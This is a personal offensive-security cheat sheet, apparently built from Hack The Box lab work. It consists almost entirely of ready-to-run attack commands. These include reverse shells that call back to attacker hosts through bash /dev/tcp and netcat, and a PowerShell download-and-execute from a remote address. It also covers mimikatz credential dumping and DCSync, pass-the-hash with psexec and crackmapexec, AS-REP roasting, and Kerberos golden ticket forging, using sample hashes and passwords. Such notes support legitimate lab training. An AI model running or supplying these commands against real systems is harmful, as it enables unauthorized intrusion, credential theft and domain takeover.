### nmap ###
  # basic
  sudo nmap -T4 -sS -sV -O -p - <IP>

  # standard output
  sudo nmap -T4 -oN res.out -sS -sV -O -p - <IP>

  # metasploit output
  sudo nmap -T4 -oX res.xml -sS -sV -O -p - <IP>

  # ping scan 
  sudo nmap -T4 -Pn -sS -sV -O -p - <IP>
  
### Metasploit ###
  # meterpreter
    # Execute scripts
    > load powershell
    > powershell_import /home/kali/Documents/hackthebox/useful/scripts/PowerView.ps1
    > powershell_execute Get-NetDomain

  # msfvenom cheat sheet
    # https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

### Shell from command execution ###

  # netcat linux
  nc -lnvp <PORT>
  bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

  # netcat windows
    # Download netcat exe for windows  
    wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
    # upload the exe on the target 
    lcd /home/kali/Downloads/netcat-1.11
    upload nc.exe
    # create a listener on the attacker machine
    nc -nlvp 1234 
    # Create reverse shell by connecting from the target
    execute -f nc.exe -a "-e cmd.exe 10.10.14.184 1234"
    # without meterpreter
    ./nc.exe -e cmd.exe 10.10.14.28 2222

  # stable shell from netcat
    # python
    python3 -c 'import pty;pty.spawn("/bin/bash");'

### mimikatz ###
  # command line
  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

  # dcsync
  .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:htb.local /user:krbtgt" exit;

### crackmapexec ###

  # Anonymous shares
  crackmapexec smb <IP> -u 'a' -p '' --shares

  # hashes 
  crackmapexec smb <IP> -H 'HASH:HASH' 


### Hashdump ###
  # Meterpreter
  run post/windows/gather/smart_hashdump
  
  # Try to migrate to a different process (LSASS for example to make it work)

### psexec ###

  # Metasploit 
  use exploit/windows/smb/psexec
  set payload windows/meterpreter/reverse_tcp
  Only works sometimes if the hash if given with following format:
    00000000000000000000000000000000:8a4b77d52b1845bfe949ed1b9643bb18
	
  # basic
  psexec.py Domain/user:password@192.168.1.2

  # hash
  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 powershell.exe

### Kerberos ###
  # AS-REP Roasting
    # get TGT 
    # Be careful to properly put correct domain name
    # For one user
    GetNPUsers.py megacorp/svc_bes -request -format john -no-pass -dc-ip 10.10.10.30 -outputfile ./hashes.txt   

    # for a list of users
    GetNPUsers.py htb/ -usersfile users.txt -dc-ip forest

    # crack
    john hashes.txt -wordlist=/usr/share/wordlists/rockyou.txt

  # Golden ticket
    # Get krbtgt hash
    secretsdump.py Administrator:vagrant@192.168.64.133

    # Get domain SID 
    # Also possible to get it via mimikatz during the dump
    lookupsid.py svc-alfresco:s3rvice@forest

    # Generate krbtgt ticket
    ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local krbtgt

    # export environnement variable
    export KRB5CCNAME=/home/kali/Documents/hackthebox/labs/machines/forest/krbtgt.ccache

    # use the ticket
     python psexec.py htb.local/krbtgt@forest -k -no-pass

    # if Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
    ntpdate <IP of DC>



### Powershell / post exploitation ###

  # download a file HTTP   	
  Invoke-WebRequest -Uri "http://xx.xx.xx.xx" -OutFile "C:\path\file"
  iex(new-object net.webclient).downloadstring("http://10.10.14.17:2222/exploit.ps1")


  # acl of a file 
  icacls .\job.bat
  (Get-Acl .\job.bat).Access 

  # Import-module from source
  Import-Module .\SimplySql.psd1

  # domain info
  Get-ADDomain

  # SPN info
  setspn -T MEGACORP -F -Q */*

### john ###
   # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  

### bloodhound ###

   # Extract
   ./SharpHound.ps1
   
### impacket ###

  # DCSYNC 
  secretsdump.py svc-alfresco:s3rvice@10.10.10.161





